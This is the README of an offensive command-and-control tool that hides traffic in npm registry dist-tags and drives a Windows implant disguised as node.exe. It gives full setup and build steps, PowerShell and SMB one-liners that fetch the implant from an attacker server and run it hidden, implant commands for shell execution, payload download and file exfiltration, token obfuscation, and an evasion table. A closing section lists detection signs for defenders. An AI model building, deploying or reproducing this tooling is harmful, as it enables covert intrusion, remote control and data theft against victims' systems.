# npm-c2

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Language](https://img.shields.io/badge/language-Python%203.8%2B-blue)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%20x64-lightgrey)]()

C2 channel over npm registry dist-tags. Reading tags requires zero
authentication. Writing tags requires an npm token (operator) or optionally
the same token embedded in the implant for write-back. Implant compiles to a
Node.js-masquerading EXE. Tags on the wire look like CI build artifacts.

    # operator pushes a command
    npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami

    # implant on target runs it (no --token needed, embedded obfuscated)
    C:\Windows\node.exe -p npx-telemetry-collector --interval 120

    # operator reads output
    npm-c2 operator -p npx-telemetry-collector -t npm_xxxx poll
    [res] DESKTOP-R7G3\user

## Contents

- [Architecture](#architecture)
- [Installation](#installation)
- [Quick Reference](#quick-reference)
- [Setup Guide](#setup-guide)
- [Build the Implant](#build-the-implant)
- [Deploy](#deploy)
- [Walkthrough](#walkthrough)
- [Implant Commands](#implant-commands)
- [Protocol](#protocol)
- [Token Obfuscation](#token-obfuscation)
- [OPSEC](#opsec)
- [Detection](#detection)
- [Limitations](#limitations)
- [Troubleshooting](#troubleshooting)
- [License](#license)

## Architecture

```
┌─ operator ───────────────────┐     ┌─ registry.npmjs.org ────┐     ┌─ implant ──────┐
│ npm-c2 operator task --cmd   │     │                          │     │                │
│   PUT + tag name + Bearer    │────>│  x64-<nonce>_<b64>      │<────│  GET every N   │
│                              │     │  arm64-<nonce>_<b64>    │     │  seconds       │
│ npm-c2 operator poll         │     │  ia32-<nonce>           │     │                │
│   GET all dist-tags          │<────│  latest -> 1.0.0        │────>│  PUT result    │
│   decode + print             │     │                          │     │  exec cmd      │
└──────────────────────────────┘     └──────────────────────────┘     └────────────────┘
```

Reading tags requires no authentication. Writing tags requires an npm token
scoped to the package. The token can be embedded in the implant XOR-obfuscated
with SHA256(package) as key.

## Installation

```
pip install -e .
```

Requires Python 3.8+. The only runtime dependency is `requests`.

```
npm-c2 --version
npm-c2 --self-test
```

Expected output:

```
1.0.0
[+] all tests ok
```

## Quick Reference

### Operator

```
npm-c2 operator -p <pkg> -t <tok> task --cmd "whoami"
npm-c2 operator -p <pkg> -t <tok> task --file script.ps1
npm-c2 operator -p <pkg> -t <tok> poll
npm-c2 operator -p <pkg> -t <tok> watch
npm-c2 operator -p <pkg> -t <tok> beacons
npm-c2 operator -p <pkg> -t <tok> clean
npm-c2 operator -p <pkg> -t <tok> clean --all
npm-c2 operator -p <pkg> -t <tok> stats
```

### Build

```
npm-c2 --generate-standalone > implant.py
npm-c2 --generate-standalone -t <tok> -p <pkg> > implant.py
npm-c2 obfuscate -p <pkg> -t <tok>
build.bat
```

### Implant

```
python standalone_implant.py -p <pkg> --interval 120
node.exe -p <pkg> --interval 120
```

## Setup Guide

### 1. Create an npm account

Register at https://npmjs.com. Enable two-factor authentication with a
security key (Windows Hello, YubiKey). npm no longer accepts TOTP.

### 2. Publish a package

```
mkdir c2-channel && cd c2-channel
npm init -y
```

Edit `package.json`. Pick a benign name:

- `npx-telemetry-collector`
- `@scope/internal-metrics` (scoped packages need `--access public`)
- `telemetry-aggregator-v2`

```
npm publish
```

Publish once. You never need to update the package. The version stays at
1.0.0. All data flows through dist-tags, not package content.

### 3. Create a token

```
npm token create --bypass-2fa --name npm-c2
```

Or create at https://npmjs.com/settings/tokens. Required settings:

| setting | value |
|---------|-------|
| Scope | single package (the one you published) |
| Permission | Read and Write |
| Bypass 2FA | enabled |

A scoped token limits damage to one package if extracted.

Note on the 2027 deprecation: npm will stop bypass2fa tokens from publishing
directly in January 2027. Reading tags never requires auth. Create your token
before the deadline.

### 4. Test the operator

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx stats
```

Expected output:

```
[+] x64-1d3573_d2hvYW1p
pending: 1, results: 0, beacons: 0
```

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean
```

## Build the Implant

### Generate the Python standalone

```
# Read-only mode (no token)
npm-c2 --generate-standalone > standalone_implant.py

# Write-back mode (token embedded obfuscated)
npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
```

The token is XOR-obfuscated with SHA256(package)[:16]. The string `npm_`
never appears in the file. Decryption happens in memory at startup.

### Compile to EXE

```
pip install pyinstaller
build.bat
```

Produces `dist\node.exe`.

| attribute | value |
|-----------|-------|
| File name | node.exe |
| Description | Node.js Event-based I/O |
| Company | Node.js Foundation |
| Version | 22.7.0.0 |
| Console | none |

The binary is a single PE file. No additional files or Python installation
required on the target.

## Deploy

### Compiled EXE (recommended)

Serve `node.exe` from any HTTP server.

```
powershell -c "iwr -Uri http://your-server/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 120' -WindowStyle Hidden"
```

### Python script (needs Python on target)

```
python standalone_implant.py -p npx-telemetry-collector --interval 120 --verbose
```

The script has zero pip dependencies. Only stdlib.

### SMB

```
copy \\smb\share\node.exe %TEMP%\node.exe
start /b %TEMP%\node.exe -p npx-telemetry-collector --interval 120
```

## Walkthrough

### Phase 1: Queue a command

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
[+] x64-1d3573_d2hvYW1p
```

A dist-tag is created: `x64-1d3573_d2hvYW1p`. The base64 decodes to
`whoami`. The nonce `1d3573` prevents tag collision.

### Phase 2: Deploy the implant

```
npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
build.bat
```

Serve `dist\node.exe` from a web server. On target:

```
powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 30' -WindowStyle Hidden"
```

### Phase 3: Read the result

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx poll
[res] DESKTOP-R7G3\user
```

The implant created an `arm64-*` tag with the base64-encoded output. The
operator decodes and prints it.

### Phase 4: Interact

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd "ipconfig /all"
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx watch --interval 5
```

### Phase 5: Clean up

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean --all
[+] removed 12 tags
```

Only `latest -> 1.0.0` remains. No trace of C2 activity in the registry.

## Implant Commands

| format | example | description |
|--------|---------|-------------|
| `shell command` | `whoami` | Executes via subprocess. Returns stdout + stderr. |
| `exec:<cmd>` | `exec:powershell -enc ...` | Explicit exec prefix. Use when command starts with a reserved word. |
| `dl:<url>:<path>` | `dl:http://server/payload.exe:C:\temp\upd.exe` | Downloads a file. Creates directories. |
| `up:<path>` | `up:C:\Users\user\pass.txt` | Reads a file. Returns base64. |
| `sleep:<sec>` | `sleep:300` | Changes poll interval at runtime. |
| `exit` | `exit` | Removes all tags. Terminates. |

Any string without a recognized prefix runs as a shell command.

## Protocol

### Tag format

```
<prefix><nonce>_[<base64url payload>]
```

| part | bytes | description |
|------|-------|-------------|
| prefix | 4 | x64-, arm64-, ia32- |
| nonce | 6 | 3 random bytes as hex |
| _ | 1 | separator |
| payload | ~239 | base64url encoded data |

### Tag types

| pattern | purpose | writer | appearance |
|---------|---------|--------|------------|
| x64-<nonce>_<b64> | command | operator | CI build artifact |
| arm64-<nonce>_<b64> | result | implant | CI build artifact |
| ia32-<nonce> | heartbeat | implant | CI build artifact |
| latest | static | npm | published version |

All protocol tags point to `1.0.0`. The value is irrelevant.

### Capacity

One tag holds about 170 bytes of raw data. Commands longer than that split
across multiple tags, each with its own nonce. The implant processes each
tag as an independent command. For large payloads use `dl:` to fetch from
a remote server.

### Polling

The implant sleeps `interval + random(0, jitter)` seconds per cycle.
Default: 60-80 seconds. Every 10 cycles it sends a heartbeat tag.
Seen tags persist to a state file and survive restarts.

## Token Obfuscation

```
plaintext:  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
key:        SHA256("npx-telemetry-collector")[:16]
XOR:        85252546b6187c0395f050fa27604e9f...
```

The token is XOR-encrypted with the first 16 bytes of SHA256(package).
The key is deterministic per package. Different package, different key.

Properties:

- The string `npm_` does not appear in the binary
- The obfuscated output is a hex string that looks like a hash
- Decryption happens in memory at startup
- Wrong package name produces garbage (None)

Commands:

```
# Print obfuscated hex only
npm-c2 obfuscate -p npx-telemetry-collector -t npm_xxxx

# Embed directly during standalone generation
npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > implant.py
```

This is obfuscation, not encryption. The deobfuscation code is in the same
binary. A determined reverser can extract the token. Combine with short-lived
tokens and scoped permissions.

## OPSEC

| surface | mitigation |
|---------|------------|
| Network traffic | registry.npmjs.org:443, whitelisted by most proxies |
| Polling pattern | Gaussian jitter, no fixed interval |
| Process name | node.exe, Node.js metadata |
| User-Agent | npm/11.18.0 node/v22.7.0 win32 x64 |
| Token | XOR-obfuscated, not visible in strings, decrypted in memory |
| Tag names | x64-*, arm64-*, ia32-* -- look like CI platform builds |
| State file | %APPDATA%\Microsoft\Crypto\.rsa_*.idx, blends with Crypto API |
| Cache | Cloudflare caches GET, no direct hit on npm origin |

## Detection

For defenders. Understanding the detection surface helps both sides.

1. A non-Node.js process polling registry.npmjs.org at regular intervals.
2. Rapid creation and deletion of dist-tags. Normal packages change tags
   a few times a day. C2 changes them every poll cycle.
3. A package with only version 1.0.0 but accumulating dozens of dist-tags.
4. User-Agent mismatch: Python-urllib/3.x instead of npm CLI UA.
5. TLS JA3 fingerprint of Python/Go differs from Node.js (Schannel).
6. npm token in non-Node.js process memory or binary.

## Limitations

**Cache.** Cloudflare may cache GET responses up to 60 seconds. Writes
bypass cache immediately.

**Token expiry.** npm bypass2fa tokens lose publish ability in January
2027. Reads never require auth. Create tokens before the deadline.

**Single-threaded.** The implant polls, executes, and writes sequentially.
A long-running command blocks the next poll. Use `dl:` to fetch a script
that runs in a separate process.

**No encryption beyond HTTPS.** Tag names and values travel in plaintext
inside the TLS tunnel. npm and Cloudflare can see raw tag data. Do not
send operational secrets as commands.

**Windows only.** The implant targets Windows. The operator runs on any
OS with Python.

## Troubleshooting

**Tag write returns 401.** The token lacks write permission. Verify token
scope and permissions at https://npmjs.com/settings/tokens.

**Tag write returns 403.** The token needs bypass2fa. Create a new token
with bypass2fa enabled or use interactive npm login.

**Poll returns no results.** The implant may not have polled yet, may lack
a token for write-back, or results were already cleaned. Use `--verbose`
on the implant to see activity.

**State file corruption.** Delete `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`
and restart. Old commands may re-execute.

## License

Apache 2.0. See [LICENSE](LICENSE).
